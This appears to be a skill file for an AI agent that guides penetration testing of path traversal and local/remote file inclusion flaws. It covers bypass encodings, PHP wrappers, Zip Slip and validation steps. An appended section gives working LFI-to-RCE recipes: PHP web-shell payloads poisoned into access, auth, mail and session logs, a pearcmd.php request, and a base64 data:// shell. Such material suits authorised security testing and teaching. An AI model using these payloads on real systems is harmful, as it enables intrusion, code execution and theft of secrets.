---
name: path-traversal-lfi-rfi
description: Path traversal and file inclusion testing for local/remote file access and code execution
---

# Path Traversal / LFI / RFI

Improper file path handling and dynamic inclusion enable sensitive file disclosure, config/source leakage, SSRF pivots, and code execution. Treat all user-influenced paths, names, and schemes as untrusted; normalize and bind them to an allowlist or eliminate user control entirely.

## Attack Surface

**Path Traversal**
- Read files outside intended roots via `../`, encoding, normalization gaps

**Local File Inclusion (LFI)**
- Include server-side files into interpreters/templates

**Remote File Inclusion (RFI)**
- Include remote resources (HTTP/FTP/wrappers) for code execution

**Archive Extraction**
- Zip Slip: write outside target directory upon unzip/untar

**Normalization Mismatches**
- Server/proxy differences (nginx alias/root, upstream decoders)
- OS-specific paths: Windows separators, device names, UNC, NT paths, alternate data streams

## High-Value Targets

**Unix**
- `/etc/passwd`, `/etc/hosts`, application `.env`/`config.yaml`
- SSH keys, cloud creds, service configs/logs

**Windows**
- `C:\Windows\win.ini`, IIS/web.config, programdata configs, application logs

**Application**
- Source code templates and server-side includes
- Secrets in env dumps, framework caches

## Reconnaissance

### Surface Map

- HTTP params: `file`, `path`, `template`, `include`, `page`, `view`, `download`, `export`, `report`, `log`, `dir`, `theme`, `lang`
- Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters
- Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
- Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
- Reverse proxies and static file servers (nginx, CDN) in front of app handlers

### Capability Probes

- Path traversal baseline: `../../etc/hosts` and `C:\Windows\win.ini`
- Encodings: `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `..%5c`, mixed UTF-8 (`%c0%2e`), Unicode dots and slashes
- Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
- Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
- Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream

## Detection Channels

### Direct

- Response body discloses file content (text, binary, base64)
- Error pages echo real paths

### Error-Based

- Exception messages expose canonicalized paths or `include()` warnings with real filesystem locations

### OAST

- RFI/LFI with wrappers that trigger outbound fetches (HTTP/DNS) to confirm inclusion/execution

### Side Effects

- Archive extraction writes files unexpectedly outside target
- Verify with directory listings or follow-up reads

## Key Vulnerabilities

### Path Traversal Bypasses

**Encodings**
- Single/double URL-encoding, mixed case, overlong UTF-8, UTF-16, path normalization oddities

**Mixed Separators**
- `/` and `\\` on Windows; `//` and `\\\\` collapse differences across frameworks

**Dot Tricks**
- `....//` (double dot folding), trailing dots (Windows), trailing slashes, appended valid extension

**Absolute Path Injection**
- Bypass joins by supplying a rooted path

**Alias/Root Mismatch**
- nginx alias without trailing slash with nested location allows `../` to escape
- Try `/static/../etc/passwd` and ";" variants (`..;`)

**Upstream vs Backend Decoding**
- Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots

### LFI Wrappers and Techniques

**PHP Wrappers**
- `php://filter/convert.base64-encode/resource=index.php` (read source)
- `zip://archive.zip#file.txt`
- `data://text/plain;base64`
- `expect://` (if enabled)

**Log/Session Poisoning**
- Inject PHP/templating payloads into access/error logs or session files then include them

**Upload Temp Names**
- Include temporary upload files before relocation; race with scanners

**Proc and Caches**
- `/proc/self/environ` and framework-specific caches for readable secrets

**Legacy Tricks**
- Null-byte (`%00`) truncation in older stacks; path length truncation

### Template Engines

- PHP include/require; Smarty/Twig/Blade with dynamic template names
- Java/JSP/FreeMarker/Velocity; Node.js ejs/handlebars/pug engines
- Seek dynamic template resolution from user input (theme/lang/template)

### RFI Conditions

**Requirements**
- Remote includes (`allow_url_include`/`allow_url_fopen` in PHP)
- Custom fetchers that eval/execute retrieved content
- SSRF-to-exec bridges

**Protocol Handlers**
- http, https, ftp; language-specific stream handlers

**Exploitation**
- Host a minimal payload that proves code execution
- Prefer OAST beacons or deterministic output over heavy shells
- Chain with upload or log poisoning when remote includes are disabled

### Archive Extraction (Zip Slip)

- Files within archives containing `../` or absolute paths escape target extract directory
- Test multiple formats: zip/tar/tgz/7z
- Verify symlink handling and path canonicalization prior to write
- Impact: overwrite config/templates or drop webshells into served directories

## Testing Methodology

1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
2. **Identify input joins** - Path joins (base + user), include/require/template loads, resource fetchers, archive extract destinations
3. **Probe normalization** - Separators, encodings, double-decodes, case, trailing dots/slashes
4. **Compare behaviors** - Web server vs application behavior
5. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution (wrapper/engine chains)

## Validation

1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
3. For RFI, prove remote fetch by OAST or controlled output; avoid destructive payloads
4. For Zip Slip, create an archive with `../` entries and show write outside target (e.g., marker file read back)
5. Provide before/after file paths, exact requests, and content hashes/lengths for reproducibility

## False Positives

- In-app virtual paths that do not map to filesystem; content comes from safe stores (DB/object storage)
- Canonicalized paths constrained to an allowlist/root after normalization
- Wrappers disabled and includes using constant templates only
- Archive extractors that sanitize paths and enforce destination directories

## Impact

- Sensitive configuration/source disclosure → credential and key compromise
- Code execution via inclusion of attacker-controlled content or overwritten templates
- Persistence via dropped files in served directories; lateral movement via revealed secrets
- Supply-chain impact when report/template engines execute attacker-influenced files

## Pro Tips

1. Compare content-length/ETag when content is masked; read small canonical files (hosts) to avoid noise
2. Test proxy/CDN and app separately; decoding/normalization order differs, especially for `%2f` and `%2e` encodings
3. For LFI, prefer `php://filter` base64 probes over destructive payloads; enumerate readable logs and sessions
4. Validate extraction code with synthetic archives; include symlinks and deep `../` chains
5. Use minimal PoCs and hard evidence (hashes, paths). Avoid noisy DoS against filesystems

## Summary

Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.


## Additional Techniques — ported from WebSkills (lfi-test)

Concrete LFI→RCE escalation recipes to pair with the LFI wrapper section above.

### Log Poisoning — exact injection commands

**Apache/Nginx access log** — poison via User-Agent, then include the log:
```bash
curl "http://target/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
# then:
http://target/index.php?file=../../../../../../var/log/apache2/access.log&c=id
```
**SSH auth.log** — inject PHP as the SSH username:
```bash
ssh '<?php system($_GET["c"]);?>'@target        # fails auth, but logs the payload
http://target/index.php?file=../../../../../../var/log/auth.log&c=id
```
**SMTP mail.log** — inject via RCPT TO over telnet:
```
telnet target 25
MAIL FROM:<a@a.com>
RCPT TO:<?php system($_GET['c']); ?>
http://target/index.php?file=../../../../../../var/log/mail.log&c=id
```
**vsftpd** — inject a PHP payload in the FTP username field, then include `/var/log/vsftpd.log`.

Common log paths to try:
```
/var/log/apache2/access.log   /var/log/apache/access.log
/var/log/apache2/error.log    /var/log/nginx/access.log
/var/log/nginx/error.log      /var/log/httpd/error_log
/usr/local/apache2/log/error_log
```

### /proc/self/environ — poison via User-Agent
```http
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### PHP session poisoning

Store a PHP payload in a session value, then include the session file:
```
POST: login=1&user=<?php system("cat /etc/passwd");?>&pass=x
include: ?lang=/../../../../var/lib/php5/sess_<PHPSESSID>
```

### Mail-spool inclusion

Send mail to a local account (`user@localhost`) with body `<?php echo system($_REQUEST["cmd"]); ?>`, then include:
```
/var/mail/<USERNAME>   or   /var/spool/mail/<USERNAME>
```

### /proc/*/fd/* file-descriptor brute

Upload many files (e.g. 100), then brute both PID and FD:
```
?page=/proc/$PID/fd/$FD
```

### No-writable-file LFI→RCE (php:// and race techniques)

When you cannot poison any on-disk file, these reach RCE from LFI alone:
- **pearcmd.php** (needs `register_argc_argv=On`):
  ```http
  GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
  ```
- **PHP_SESSION_UPLOAD_PROGRESS** — force a session file to be created/populated with your payload via a multipart upload with `PHP_SESSION_UPLOAD_PROGRESS`, then include the session file (works even without an existing session).
- **Nginx client-body temp files** — include `/proc/<nginx-pid>/fd/<n>` pointing at a buffered upload temp file before it is unlinked.
- **Segfault temp retention** — upload a file to `/tmp`, trigger a segfault so PHP never deletes the temp file, then include it.
- **phpinfo() race** (`file_uploads=On`) — leak the upload temp filename from a phpinfo page and include it before deletion.
- **php://filter chains (no file needed)** — chain conversion filters to synthesize PHP into an error/log-reflected sink. See hacktricks "lfi2rce-via-php-filters".

### data:// + base64 RFI (allow_url_include)
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
